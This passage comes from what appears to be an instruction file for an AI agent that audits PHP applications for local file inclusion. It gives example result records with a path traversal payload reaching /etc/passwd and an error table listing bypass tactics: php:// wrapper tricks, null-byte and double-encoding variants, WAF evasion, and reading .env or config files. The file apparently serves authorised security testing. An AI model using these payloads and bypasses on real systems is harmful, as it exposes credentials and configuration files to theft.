| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "lfi_include_001",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "successful_round": 1,
  "payload": "../../../../../../etc/passwd",
  "evidence_result": "root:x:0:0:root:/root:/bin/bash returned in response body",
  "severity": {
    "level": "H",
    "score": 2.25,
    "cvss": 7.5
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.25 → cvss 7.5 → level `H`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "lfi_include_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "../etc/passwd",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "L",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no file content shown as proof
- failure_reason is empty — no explanation provided
- severity_level 'L' for confirmed LFI reading /etc/passwd — should be H or C

---

## Pre-submission Self-check (MUST be executed)

After completing the exploit JSON, self-check item by item per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized self-check below (S1-S3); submit only after all are ✅
3. If any item is ❌ → correct and re-check; MUST NOT skip

### Specialized Self-check (LFI Auditor Specific)
- [ ] S1: Inclusion type (LFI/RFI) is labeled and allow_url_include configuration is confirmed
- [ ] S2: Actual file read results from path traversal payloads are shown
- [ ] S3: Wrapper exploitation methods (php://filter/input) are labeled

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Path traversal blocked by open_basedir or chroot | Attempt wrapper bypass (`php://filter`, `zip://`, `data://`); if all blocked → record `"status": "basedir_enforced"` |
| Target file not readable (permission denied) | Try alternative sensitive files (`/etc/passwd`, `config.php`, `.env`); if none readable → record `"status": "read_denied"` |
| Null byte injection ineffective (PHP ≥ 5.3.4) | Switch to path truncation or double encoding; if all fail → record `"status": "null_byte_patched"` |
| Payload blocked by WAF/filter | Log filter type, switch to encoding-bypass variant; if all variants fail → record `"waf_blocked": true` |
